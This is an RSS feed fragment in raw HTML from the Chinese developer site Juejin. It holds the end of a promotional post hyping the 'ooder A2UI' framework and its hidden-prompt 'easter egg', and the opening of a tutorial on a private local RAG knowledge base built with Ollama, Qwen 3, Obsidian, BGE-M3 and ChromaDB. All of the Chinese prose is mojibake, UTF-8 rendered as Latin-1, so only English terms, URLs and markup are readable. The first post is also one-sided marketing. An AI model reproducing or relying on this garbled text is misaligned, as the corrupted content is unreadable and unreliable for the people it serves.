<li>âœ… ç»†èŠ‚ä¼˜åŒ–æ‹‰æ»¡ â‘ å¼¹çª—è‡ªé€‚åº”ï¼šå†…å®¹å¤šå°‘è‡ªåŠ¨è°ƒå¤§å°ï¼Œä¸æº¢å‡ºä¸æµªè´¹ï¼›â‘¡è¡¨å•åˆ†é¡µç­¾ï¼šå­—æ®µå¤šçš„è¡¨å•è‡ªåŠ¨åˆ†ç»„ï¼Œæ“ä½œè¶…ç®€å•ï¼›â‘¢ä¿®å¤å¤±æ•ˆå›¾æ ‡ï¼šè‡ªåŠ¨åŒ¹é…æ–°æ¡†æ¶å›¾æ ‡åº“ï¼Œè§†è§‰ç»Ÿä¸€åˆå¥½çœ‹ï¼</li>
</ul>
<p>è°æ‡‚å•Šï¼äº¤äº’ä¸æ»‘ï¼Œè§†è§‰ç»Ÿä¸€ï¼Œå®Œå…¨è¾¾åˆ°ä¼ä¸šçº§æ ‡å‡†ï¼Œè¿™æ•ˆç‡æ¯”äººå·¥å¿«10å€éƒ½ä¸æ­¢ï¼</p>
<h2 data-id="heading-3">ğŸ” å¹•åå¯†ç ï¼æ ·æ¿å·¥ç¨‹è—å½©è›‹</h2>
<p>ä¸ºå•¥AIèƒ½å¦‚æ­¤ç²¾å‡†é«˜æ•ˆï¼Ÿæ·±å…¥æ¢ç©¶åæˆ‘ä»¬å½»åº•æ˜ç™½â€”â€”è¿™å“ªæ˜¯ç¤ºä¾‹ä»£ç å•Šï¼Œå½©è›‹é‡Œæ»¡æ»¡çš„æç¤ºè¯ï¼è€Œooder-orgç»éæ™®é€šçš„å¼€æºæ ·æ¿å·¥ç¨‹ï¼Œå®ƒæ›´æ˜¯ä¸€ä¸ªå®Œå…¨ç”±å¤§æ¨¡å‹é©±åŠ¨çš„AIä¼ä¸šå…¸èŒƒå·¥ç¨‹ã€‚AICodingèƒ½ç²¾å‡†è½åœ°å‡çº§ä»»åŠ¡ï¼Œooder-orgèƒ½æˆä¸ºAIé©±åŠ¨çš„å·¥ç¨‹æ ‡æ†ï¼ŒäºŒè€…çš„æˆåŠŸï¼Œéƒ½å¾—ç›Šäºooder A2UIæ¡†æ¶çš„å¼ºå¤§æ”¯æ’‘ï¼</p>
<p>è¿™ä¸ªè—åœ¨docç›®å½•çš„å½©è›‹ï¼Œæ­£æ˜¯ooder-orgä½œä¸ºAIé©±åŠ¨å·¥ç¨‹çš„æ ¸å¿ƒä½è¯â€”â€”é‚£äº›çœ‹ä¼¼ç®€å•çš„æ“ä½œæŒ‡å¼•ï¼Œå®åˆ™æ˜¯ä¸ºå¤§æ¨¡å‹é‡èº«å®šåˆ¶çš„ç²¾å‡†æç¤ºä½“ç³»ï¼Œä¹Ÿæ­£å› æœ‰ooder A2UIæ¡†æ¶çš„åº•å±‚æ”¯æ’‘ï¼Œè¿™äº›æç¤ºæ‰èƒ½è½¬åŒ–ä¸ºé«˜æ•ˆçš„è½åœ°æˆæœï¼Œ4æ¡æ ¸å¿ƒæŒ‡å¼•ç²¾å‡†è¦†ç›–å‡çº§å…¨å…³é”®èŠ‚ç‚¹ğŸ‘‡</p>
<ol>
<li>ğŸ“Š å…ˆæ¢³ç†å¯¹æ¯”ï¼šç”»å±æ€§åŠŸèƒ½ç»“æ„å›¾ï¼Œå’ŒçœŸå®ä»£ç å¯¹æ¯”ï¼ŒæŒ‰/URL/VIEWé‡å†™è§†å›¾å¹¶é€‚é…æœåŠ¡</li>
<li>ğŸ–¼ï¸ æ£€æŸ¥å›¾æ ‡ï¼šæ‰¾å¤±æ•ˆ/ä¸¢å¤±çš„å›¾æ ‡ï¼Œé‡æ–°åŒ¹é…è¡¥å……</li>
<li>ğŸ“ ä¼˜åŒ–å¸ƒå±€ï¼šè¯»é€šç”¨é…ç½®æ‰¾æœ€ä½³æ–¹æ¡ˆï¼Œè¡¨å•åˆ†ç»„ï¼Œä¼˜åŒ–å¤§æ–‡æœ¬ã€å¼¹çª—ç­‰äº¤äº’</li>
<li>ğŸ¨ ç»Ÿä¸€é£æ ¼ï¼šè¯»ç°æœ‰æ ·å¼ä¼˜åŒ–ï¼Œç”¨æ³¨è§£å†™æ¸…æ¥šä¼˜åŒ–é€»è¾‘</li>
</ol>
<h2 data-id="heading-4">ğŸ’¡ å¹²è´§å¯ç¤ºï¼æŠ€æœ¯äººå¿…çœ‹</h2>
<p>è¿™æ³¢å®è·µä¸ä»…è®©æˆ‘ä»¬çœ‹æ¸…äº†å½©è›‹çš„æœ¬è´¨ï¼Œæ›´è¯»æ‡‚äº†ooder-orgæˆä¸ºAIä¼ä¸šå…¸èŒƒå·¥ç¨‹çš„æ ¸å¿ƒé€»è¾‘ï¼æ€»ç»“3ä¸ªå…³é”®å¯ç¤ºï¼ŒæŠ€æœ¯äººç›´æ¥æŠ„ä½œä¸šï¼š</p>
<ol>
<li>ğŸ“Œ ooder-orgæ˜¯AIé©±åŠ¨å…¸èŒƒï¼å…¶éšè—çš„æç¤ºè¯ä½“ç³»ï¼Œä¸ºå¤§æ¨¡å‹å‚ä¸å·¥ç¨‹å¼€å‘æä¾›äº†æ ‡å‡†èŒƒå¼ï¼Œæ˜¯ä¼ä¸šçº§AIé©±åŠ¨å¼€å‘çš„ç»ä½³å‚è€ƒ</li>
<li>ğŸ“Œ ç²¾å‡†æç¤º+å¼ºå¤§æ¡†æ¶æ˜¯æ ¸å¿ƒï¼æ¸…æ™°çš„æç¤ºè¯æŒ‡å¼•è®©å¤§æ¨¡å‹æ‰¾å¯¹æ–¹å‘ï¼Œè€Œooder A2UIçš„å¼ºå¤§å…¼å®¹æ€§ä¸æ ‡å‡†åŒ–è®¾è®¡ï¼Œè®©å¤§æ¨¡å‹çš„å¼€å‘æˆæœèƒ½æ— ç¼è½åœ°ï¼ŒäºŒè€…ç¼ºä¸€ä¸å¯</li>
<li>ğŸ“Œ æ¡†æ¶é€‰å‹å†³å®šæ•ˆç‡ä¸Šé™ï¼ooder A2UIçš„åˆ†å±‚æ¶æ„ã€ä¸°å¯Œç»„ä»¶åº“ï¼Œä¸ä»…é™ä½äº†AIå¼€å‘çš„é€‚é…æˆæœ¬ï¼Œæ›´æå‡äº†ä¼ä¸šçº§å·¥ç¨‹çš„äº¤ä»˜è´¨é‡ï¼Œæ˜¯AIé©±åŠ¨å·¥ç¨‹çš„ä¼˜è´¨åº•å±‚æ”¯æ’‘</li>
</ol>
<h2 data-id="heading-5">ğŸ¯ ç»“å°¾äº’åŠ¨</h2>
<p>1å°æ—¶æå®šå·¥å…·ç„•æ–°+è¯»æ‡‚AIé©±åŠ¨å·¥ç¨‹çš„æ ¸å¿ƒé€»è¾‘ï¼Œè¿™æ³¢ä½“éªŒå½»åº•åˆ·æ–°è®¤çŸ¥ï¼ooder-orgç”¨æ»¡æ»¡çš„æç¤ºè¯å½©è›‹è¯æ˜äº†è‡ªå·±çš„AIå…¸èŒƒå±æ€§ï¼Œè€Œè¿™ä¸€åˆ‡éƒ½ç¦»ä¸å¼€ooder A2UIçš„å¼ºå¤§èµ‹èƒ½ã€‚æœ‰æ²¡æœ‰æŠ€æœ¯ä¼™ä¼´æ·±å…¥ç ”ç©¶è¿‡ooder A2UIæ¡†æ¶ï¼Ÿæˆ–è€…æœ‰AIé©±åŠ¨å·¥ç¨‹å¼€å‘çš„è¸©å‘/ç»éªŒï¼Ÿè¯„è®ºåŒºäº¤æµèµ·æ¥ï½ ğŸ‘‡</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä½¿ç”¨æœ¬åœ° Ollama + Qwen 3 æ¨¡å‹ï¼Œç»“åˆ Obsidian æ„å»ºçœŸæ­£çš„æœ¬åœ°éšç§ RAG çŸ¥è¯†åº“]]></title>    <link>https://juejin.cn/post/7588711557500616754</link>    <guid>https://juejin.cn/post/7588711557500616754</guid>    <pubDate>2025-12-29T06:34:11.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7588711557500616754" data-draft-id="7588820422991544366" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä½¿ç”¨æœ¬åœ° Ollama + Qwen 3 æ¨¡å‹ï¼Œç»“åˆ Obsidian æ„å»ºçœŸæ­£çš„æœ¬åœ°éšç§ RAG çŸ¥è¯†åº“"/> <meta itemprop="keywords" content="Ollama,Agent,LLM"/> <meta itemprop="datePublished" content="2025-12-29T06:34:11.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="AIå¤§æ¨¡å‹"/> <meta itemprop="url" content="https://juejin.cn/user/3817967696221534"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä½¿ç”¨æœ¬åœ° Ollama + Qwen 3 æ¨¡å‹ï¼Œç»“åˆ Obsidian æ„å»ºçœŸæ­£çš„æœ¬åœ°éšç§ RAG çŸ¥è¯†åº“
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3817967696221534/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    AIå¤§æ¨¡å‹
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T06:34:11.000Z" title="Mon Dec 29 2025 06:34:11 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#383838;font-size:15px;line-height:30px;letter-spacing:2px;word-break:break-word;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;scroll-behavior:smooth;background-image:linear-gradient(0deg,transparent 24%,rgba(201,195,195,.329) 25%,hsla(0,8%,80.4%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent),linear-gradient(90deg,transparent 24%,rgba(204,196,196,.226) 25%,hsla(0,4%,66.1%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent);background-color:#fff;background-size:50px 50px;padding-bottom:60px}.markdown-body ::selection{color:#fff;background-color:#a862ea}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin:24px 0 12px;color:#a862ea}.markdown-body h1{line-height:2;font-size:1.4em}.markdown-body h1~p:first-of-type:first-letter{color:#a862ea;float:left;font-size:2em;margin-right:.4em;font-weight:bolder}.markdown-body h2{font-size:1.2em}.markdown-body h3{font-size:1.1em}.markdown-body ol,.markdown-body ul{padding-left:2em}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;padding-left:.2em}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#a862ea}.markdown-body ol li.task-list-item,.markdown-body ul li.task-list-item{list-style:none}.markdown-body ol li.task-list-item ol,.markdown-body ol li.task-list-item ul,.markdown-body ul li.task-list-item ol,.markdown-body ul li.task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:10px}.markdown-body a,.markdown-body code,.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6,.markdown-body li,.markdown-body p{opacity:.85;vertical-align:baseline;transition:all .1s ease}.markdown-body a:hover,.markdown-body code:hover,.markdown-body h1:hover,.markdown-body h2:hover,.markdown-body h3:hover,.markdown-body h4:hover,.markdown-body h5:hover,.markdown-body h6:hover,.markdown-body li:hover,.markdown-body p:hover{opacity:1}.markdown-body a{display:inline-block;color:#a862ea;cursor:pointer;text-decoration:none;position:relative}.markdown-body a:after{content:"";position:absolute;width:98%;height:1px;bottom:0;left:0;transform:scaleX(0);background-color:#a862ea;transform-origin:bottom right;transition:transform .3s ease-in-out}.markdown-body a:hover:after{transform:scaleX(1);transform-origin:bottom left}.markdown-body a:active,.markdown-body a:link{color:#a862ea}.markdown-body img{max-width:100%;user-select:none;margin:1em 0;transition:transform .2s ease 0s;background-color:#f8f5ff;box-shadow:0 0 10px #e7daff}.markdown-body img:hover{opacity:1;box-shadow:0 0 20px #e7daff;transform:translateY(-1px)}.markdown-body blockquote{padding:.5em 1em;margin:12px 0;border-top-left-radius:2px;border-bottom-left-radius:2px;border-left:3px solid #a862ea;background-color:#f8f5ff}.markdown-body blockquote&gt;p{margin:0}.markdown-body .math{font-style:italic;margin:12px 0;padding:.5em 1em;background-color:#f8f5ff}.markdown-body .math&gt;p{margin:0}.markdown-body code{padding:2px .4em;overflow-x:auto;color:#a862ea;font-weight:700;word-break:break-word;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;background-color:#f8f5ff}.markdown-body pre{margin:2em 0}.markdown-body pre&gt;code{display:block;padding:1.5em;word-break:normal;font-size:.9em;font-style:normal;font-weight:400;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;line-height:18px;color:#383838;border-radius:2px;scroll-behavior:smooth;box-shadow:0 0 10px #e7daff}.markdown-body pre&gt;code:hover{box-shadow:0 0 20px #e7daff}.markdown-body pre&gt;code::-webkit-scrollbar{height:6px;background-color:#f8f5ff}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:#e7daff;border-bottom-left-radius:3px;border-bottom-right-radius:3px}.markdown-body hr{margin:2em 0;border-top:1px solid #a862ea}.markdown-body table{width:100%;font-size:12px;max-width:100%;overflow:auto;border-collapse:collapse}.markdown-body thead{color:#a862ea;background:#f8f5ff}.markdown-body td,.markdown-body th{padding:.5em;border:1px solid #e7daff}.markdown-body tr{background-color:#f8f5ff}@media (max-width:720px){.markdown-body{font-size:12px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>æœ¬æ–‡è¾ƒé•¿ï¼Œå»ºè®®ç‚¹èµæ”¶è—ã€‚æ›´å¤šAIå¤§æ¨¡å‹åº”ç”¨å¼€å‘å­¦ä¹ è§†é¢‘åŠèµ„æ–™ï¼Œåœ¨<a href="https://link.juejin.cn?target=https%3A%2F%2Fgitcode.com%2FEnjoyEDU%2FLLM" target="_blank" title="https://gitcode.com/EnjoyEDU/LLM" ref="nofollow noopener noreferrer">è¿™é‡Œ</a>ã€‚</p>
</blockquote>
<p>åœ¨ä¸Šä¸€ç¯‡æ–‡ç« ä¸­ï¼Œæˆ‘ä»‹ç»äº†è‡ªå·±ä½¿ç”¨ Obsidian ç»“åˆ PARA æ–¹æ³•è®ºæ­å»ºèµ·äº†è‡ªå·±çš„æœ¬åœ°çŸ¥è¯†åº“ï¼ŒåŒæ—¶ä»‹ç»äº†å¦‚ä½•ä½¿ç”¨ Gemini CLI è®© Obsidian æœ‰äº†å¼ºå¤§çš„ AI èƒ½åŠ›ã€‚</p>
<p>è™½ç„¶ Gemini å¾ˆå¼ºï¼Œä½†å®ƒæ¯•ç«Ÿæ˜¯äº‘ç«¯æ¨¡å‹ï¼Œå°†ç§äººçš„ç¬”è®°æ•°æ®å‘é€åˆ°äº‘ç«¯å§‹ç»ˆæ˜¯è®¸å¤šäººå¿ƒä¸­çš„ä¸€æ ¹åˆºã€‚</p>
<p>ä»Šå¤©æ¥ä»‹ç»ä¸‹æˆ‘æ˜¯å¦‚ä½•ä½¿ç”¨Â <strong>æœ¬åœ° Ollama + Qwen 3 æ¨¡å‹</strong>ï¼Œç»“åˆÂ <strong>Obsidian</strong>Â æ„å»ºçœŸæ­£çš„æœ¬åœ°éšç§ RAGï¼ˆæ£€ç´¢å¢å¼ºç”Ÿæˆï¼‰çŸ¥è¯†åº“çš„ã€‚æˆ‘çš„ç›®æ ‡å¾ˆæ˜ç¡®ï¼š<strong>æ‰“é€ ä¸€ä¸ªå®Œå…¨ç¦»çº¿ã€ç»å¯¹éšç§ã€ä¸”æ‡‚ä½ çš„ç§äºº AI åŠ©ç†</strong>ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/81c198f5af1f492f8cfd698ca4c0bbf0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnlpKfmqKHlnos=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767594851&amp;x-signature=4NECfTbtnogZ%2FkTbaqpOKCQgJT0%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-0">ä¸ºä»€ä¹ˆè¦ â€œå®Œå…¨æœ¬åœ°åŒ–â€ï¼Ÿ</h2>
<p>Obsidian çš„æ ¸å¿ƒä»·å€¼è§‚æ˜¯Â  <strong>"Your data is yours"</strong> ï¼ˆä½ çš„æ•°æ®å±äºä½ ï¼‰ã€‚å½“æˆ‘ä»¬æŠŠæ‰€æœ‰çš„æ€è€ƒã€æ—¥è®°ã€å·¥ä½œè®¡åˆ’éƒ½è®°å½•åœ¨è¿™äº› Markdown æ–‡ä»¶ä¸­æ—¶ï¼Œå®ƒä»¬å°±æ„æˆäº†æˆ‘ä»¬çš„"ç¬¬äºŒå¤§è„‘"ã€‚</p>
<p>ç„¶è€Œï¼Œä¼ ç»Ÿçš„äº‘ç«¯ AI åŠ©æ‰‹å­˜åœ¨å¤©ç„¶çš„æ‚–è®ºï¼š</p>
<ol>
<li><strong>éšç§æ³„éœ²é£é™©ï¼šè¦è®© AI æ‡‚ä½ ï¼Œå°±å¾—æŠŠæ•°æ®å‘ç»™å®ƒï¼›å‘ç»™å®ƒï¼Œæ•°æ®å°±ç¦»å¼€äº†ä½ çš„æ§åˆ¶ã€‚</strong></li>
<li><strong>ç½‘ç»œä¾èµ–ï¼š éå¸¸ä¾èµ–äºåœ¨çº¿ç½‘ç»œï¼Œå¦‚æœæ–­ç½‘å°±å®Œå…¨ä¸å¯ç”¨ã€‚</strong></li>
<li><strong>æ•°æ®å®‰å…¨ï¼šä½ çš„ä¸ªæ€§åŒ–æ¨¡å‹åœ¨äº‘ç«¯æœåŠ¡ï¼Œå¦‚æœäº‘æœåŠ¡åœæ­¢è¿è¥ï¼Œä¸ªäººè®­ç»ƒçš„æ¨¡å‹ä¹Ÿå°±æ¶ˆå¤±äº†ã€‚</strong></li>
</ol>
<p>å¦‚æœä½ æœ‰ä¸€å°è¿˜ä¸é”™çš„ç”µè„‘ï¼Œé‚£ä¹ˆæ„å»º<strong>æœ¬åœ° RAG</strong>Â çŸ¥è¯†åº“å°±å®Œç¾è§£å†³äº†è¿™ä¸ªé—®é¢˜ï¼šæ•°æ®ä¸å‡ºé—¨ï¼Œæ¨ç†åœ¨æœ¬åœ°ï¼Œä¸ä»…å®‰å…¨åˆé«˜æ•ˆã€‚</p>
<h2 data-id="heading-1">æˆ‘æƒ³è¦çš„æ˜¯ä»€ä¹ˆï¼Ÿ</h2>
<p>æœ‰äº†æ„å»ºçš„æƒ³æ³•ï¼Œæ¥ä¸‹æ¥å°±æ˜¯å¦‚ä½•å®æ–½ã€‚å…¶å®ä¸€ç›´ä»¥æ¥ï¼Œæˆ‘éƒ½æ¸´æœ›æ‹¥æœ‰ä¸€ä¸ªèƒ½è®°å¿†ä¸ªäººæ•æ„Ÿä¿¡æ¯çš„æ™ºèƒ½ä½“åŠ©ç†ã€‚æˆ‘å¯ä»¥æ”¾å¿ƒåœ°å°†ä¸€äº›ä¸ªäººæˆ–å®¶äººçš„æ•æ„Ÿæ•°æ®äº¤ç»™å®ƒï¼Œè€Œå®ƒä¹Ÿèƒ½éšæ—¶å‡†ç¡®åœ°å›ç­”æˆ‘çš„æé—®ã€‚</p>
<p>æ¯”å¦‚æˆ‘å¯ä»¥é—®å®ƒï¼šâ€œæˆ‘çˆ¸å¦ˆçš„èº«ä»½è¯å·æ˜¯å¤šå°‘ï¼Ÿâ€â€œæˆ‘å»å¹´è¿‡å¹´çš„å¹´å¤œé¥­éƒ½åƒäº†ä»€ä¹ˆï¼Ÿâ€â€œä»Šå¹´çš„è½¦é™©æˆ‘æ˜¯ä»€ä¹ˆæ—¶å€™ç¼´çš„ï¼Ÿâ€â€œå…­ä¸€å„¿ç«¥èŠ‚æ™šä¸Šæˆ‘å’Œå­©å­ä»¬èŠäº†ä»€ä¹ˆï¼Ÿâ€æ¶‰åŠéšç§çš„ç»†èŠ‚é—®é¢˜ã€‚</p>
<p>å› ä¸ºæˆ‘ä»¬ä½¿ç”¨ Obsidian ä½œä¸ºçŸ¥è¯†åº“ï¼Œæ‰€æœ‰çš„çŸ¥è¯†éƒ½å­˜å‚¨åœ¨æœ¬åœ°ã€‚é…åˆ Thino æ’ä»¶ï¼Œå¯ä»¥å®ç°ç±»ä¼¼äº Flomo çš„çµæ„Ÿè®°å¿†å­˜å‚¨ã€‚æˆ‘ä¾¿å°†è¿™ä¸ªæ’ä»¶ä¸æ—¥è®°åŠŸèƒ½ç»“åˆèµ·æ¥ï¼Œä¸“é—¨ç”¨æ¥è®°å½•ç”Ÿæ´»ä¸­çš„çäº‹ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/51ae40be15ae48d9bb7675dddfc2ebba~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnlpKfmqKHlnos=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767594851&amp;x-signature=6Nmq0NZSPDeRAULCdqE5xquSPUU%3D" alt="" loading="lazy"/></p>
<p>ä¹‹å‰ä¸€ç›´æ²¡æœ‰æ‰¾åˆ°å®ç°è¿™ä¸ªç›®æ ‡çš„æœ‰æ•ˆè·¯å¾„ï¼Œç›´åˆ°æˆ‘ä½¿ç”¨ Obsidian ä½œä¸ºæˆ‘çš„çŸ¥è¯†åº“ï¼Œæˆ‘è¿™ä¸ªæƒ³æ³•æ‰çœŸæ­£çš„å˜æˆäº†ç°å®ã€‚</p>
<h2 data-id="heading-2">æ„å»ºçš„åº•å±‚åŸç†ï¼šä»€ä¹ˆæ˜¯ RAGï¼Ÿ</h2>
<p>æ„å»ºä¸ªäººçŸ¥è¯†åº“æ™ºèƒ½é—®ç­”ä½“ï¼Œå…¶å®æ ‡å‡†çš„åšæ³•é‚£å°±æ˜¯ RAGã€‚</p>
<p>ä»€ä¹ˆæ˜¯ RAGï¼Ÿ<strong>RAG (Retrieval-Augmented Generationï¼Œæ£€ç´¢å¢å¼ºç”Ÿæˆ)</strong> Â æœ€ç®€å•ç†è§£æ˜¯ï¼š<strong>å®ƒç»™å¤§æ¨¡å‹ï¼ˆLLMï¼‰é…äº†ä¸€ä¸ªå®æ—¶æŸ¥é˜…çš„â€œå¤–æŒ‚æ•°æ®åº“â€æˆ–â€œç¦»çº¿æ‰‹å†Œâ€ã€‚</strong></p>
<p>å¤§æ¨¡å‹è™½ç„¶å¼ºå¤§ï¼Œä½†æœ‰ä¸¤ä¸ªè‡´å‘½ä¼¤ï¼š</p>
<ol>
<li><strong>å¹»è§‰ï¼ˆHallucinationï¼‰ï¼šæ²¡è§è¿‡çš„æ•°æ®å®ƒä¼šä¸€æœ¬æ­£ç»åœ°èƒ¡è¯´å…«é“ã€‚</strong></li>
<li><strong>çŸ¥è¯†æ»åï¼šå®ƒçš„çŸ¥è¯†åœç•™åœ¨è®­ç»ƒç»“æŸçš„é‚£ä¸€å¤©ï¼ˆæ¯”å¦‚ 2023 æˆ– 2024 å¹´ï¼‰ã€‚</strong></li>
</ol>
<p><strong>RAG çš„æ ¸å¿ƒæ€æƒ³ï¼š</strong> Â æ—¢ç„¶æ¨¡å‹ä¸èƒ½å®æ—¶è®°ä½æ‰€æœ‰æ–°çŸ¥è¯†ï¼Œé‚£å°±åœ¨å›ç­”é—®é¢˜å‰ï¼Œå…ˆå»â€œä¹¦æ¶â€ä¸ŠæŠŠç›¸å…³çš„èµ„æ–™æŸ¥å‡ºæ¥ï¼Œè´´åœ¨ Prompt åé¢å‘ç»™æ¨¡å‹ï¼šâ€œè¯·å‚è€ƒä»¥ä¸‹èµ„æ–™å›ç­”é—®é¢˜â€ã€‚</p>
<p>æ‰€ä»¥æˆ‘ä»¬åªè¦æŠŠæˆ‘ä»¬çš„ Obsidian æœ¬åœ°çŸ¥è¯†åº“ä½œä¸ºå¤–æŒ‚çŸ¥è¯†åº“è®©æœ¬åœ°çš„æ¨¡å‹å‚è€ƒï¼Œé‚£ä»–å°±å¯ä»¥åŸºäºè¿™äº›çŸ¥è¯†å›ç­”æˆ‘ä»¬çš„é—®é¢˜ã€‚</p>
<p>ä½†æ˜¯ä¸€èˆ¬çš„æ¨¡å‹å¹¶ä¸èƒ½ç›´æ¥è¯»å–åŸå§‹çš„æ–‡æ¡£ï¼Œè¿™ä¸­é—´éœ€è¦ä¸€ä¸ªå¯¹æ–‡æ¡£å»ºç«‹ç´¢å¼•çš„è¿‡ç¨‹ï¼Œä¹Ÿå°±æ˜¯å°†æ–‡æ¡£å‘é‡åŒ–ã€‚å…·ä½“çš„è¿‡ç¨‹å¦‚ä¸‹ï¼š</p>
<ol>
<li><strong>è¯»å–ï¼šæ‰«æ Obsidian åº“ä¸­çš„ .mdæ–‡ä»¶ã€‚</strong></li>
<li><strong>åˆ‡ç‰‡ï¼šæŠŠé•¿æ–‡ç« åˆ‡åˆ†æˆä¸€ä¸ªä¸ªå°çš„æ–‡æœ¬å—ï¼ˆChunksï¼‰ã€‚</strong></li>
<li><strong>åµŒå…¥ (Embedding)ï¼šåˆ©ç”¨ BGE-M3 æ¨¡å‹ï¼Œå°†è¿™äº›æ–‡æœ¬å—è½¬æ¢æˆé«˜ç»´å‘é‡ã€‚æ¯”å¦‚ï¼Œ"Obsidian æ’ä»¶é…ç½®" è¿™æ®µæ–‡å­—ä¼šè¢«è½¬åŒ–æˆä¸€ç»„ä»£è¡¨å…¶è¯­ä¹‰çš„æ•°å­—ã€‚</strong></li>
<li><strong>å­˜å‚¨ï¼šå°†è¿™äº›å‘é‡å­˜å…¥æœ¬åœ°çš„ ChromaDB æ•°æ®åº“ã€‚</strong></li>
</ol>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8a174bf9a66b4f5aa120a1280a09e9d4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnlpKfmqKHlnos=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767594851&amp;x-signature=rAN%2FyD5%2FX7mzRxTXQnemoNiQuUY%3D" alt="" loading="lazy"/></p>
